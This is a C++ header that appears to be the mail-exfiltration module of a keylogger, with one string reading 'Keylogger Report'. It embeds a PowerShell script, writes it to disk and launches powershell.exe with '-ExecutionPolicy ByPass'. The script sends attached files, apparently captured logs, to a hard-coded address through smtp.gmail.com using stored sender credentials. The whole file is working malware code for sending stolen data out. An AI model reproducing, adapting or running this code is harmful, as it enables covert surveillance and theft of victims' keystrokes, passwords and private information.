#pragma once
#include<fstream>
#include<vector>


#define SCRIPT_NAME  "sendMail.ps1"

namespace Mail {
#define EMAIL_TO  "email address receiver"
#define EMAIL_FROM  "email address sender"
#define EMAIL_PASS  "email password for sender address"
	const std::string& PowerShellScript1 =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(EMAIL_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(EMAIL_PASS) +
		"\""
		" -From \"" +
		std::string(EMAIL_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

	 const std::string& temp = "$Msg = New-Object System.Net.Mail.MailMessage('" + std::string(EMAIL_TO) + "', '" + std::string(EMAIL_FROM) + "', 'Keylogger Report', 'Keylogger Report');$Srv = 'smtp.gmail.com';$Client = New-Object Net.Mail.SmtpClient($Srv, 587);$Client.UseDefaultCredentials = $false;$Client.Credentials = New-Object System.Net.NetworkCredential('xisijof695', '" + std::string(EMAIL_PASS) + "');$Client.EnableSsl = $true;";
	 std::string PowerShellScript = temp;
#undef EMAIL_TO
#undef EMAIL_FROM
#undef EMAIL_PASS

	std::string StringReplace(std::string s, const std::string& what, const std::string& with) {
		if (what.empty())
			return s;
		size_t sp = 0;
		while ((sp = s.find(what, sp)) != std::string::npos)
			s.replace(sp, what.length(), with), sp += with.length();
		return s;
	}

	bool CheckFileExists(std::string &f) {
		std::ifstream file(f);
		return (bool)file;
	}

	bool CreateScript() {
		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
		if (!script)
			return false;
		script << PowerShellScript1;
		if (!script)
			return false;
		script.close();
		return true;
	}

	Timer m_timer;

	int SendMail(const std::string& subject, const std::string& body, const std::string& attachments,int many = 0) {
		bool ok;
		ok = IO::MakeDir(IO::GetOurPath(true));
		if (!ok)
			return -1;
		std::string src_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
		if (!CheckFileExists(src_path)) {
			ok = CreateScript();
			if (!ok)
				return -2;
		}

		std::string param = "-ExecutionPolicy ByPass -File \"" + src_path + "\" -Subj \"" + subject + "\" -Body \"" + body + "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFO shellinfo = { 0 };
		shellinfo.cbSize = sizeof(SHELLEXECUTEINFO);
		shellinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		shellinfo.hwnd = NULL;
		LPCWSTR r = L"open";
		LPCWSTR r1 = L"powershell.exe";
		shellinfo.lpVerb = r;
		shellinfo.lpFile = r1;
		std::wstring temp = std::wstring(param.begin(), param.end());
		shellinfo.lpParameters = temp.c_str();
		shellinfo.lpDirectory = NULL;
		shellinfo.nShow = SW_SHOW;
		shellinfo.hInstApp = NULL;

		ok = (bool)ShellExecuteEx(&shellinfo);
		if (!ok)
			return -3;

		DWORD exit_code = 100;
		WaitForSingleObject(shellinfo.hProcess, INFINITE);
		GetExitCodeProcess(shellinfo.hProcess, &exit_code);

		return (int)exit_code;
	}


	int SendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& attachments) {
		std::string atts = "";
		if (attachments.size() == 1U)
			atts = attachments.at(0);
		else {
			for (const auto& v : attachments)
				atts += v + "::";
			atts = atts.substr(0, atts.length() - 2);
		}
		return SendMail(subject, body, atts);
	}
}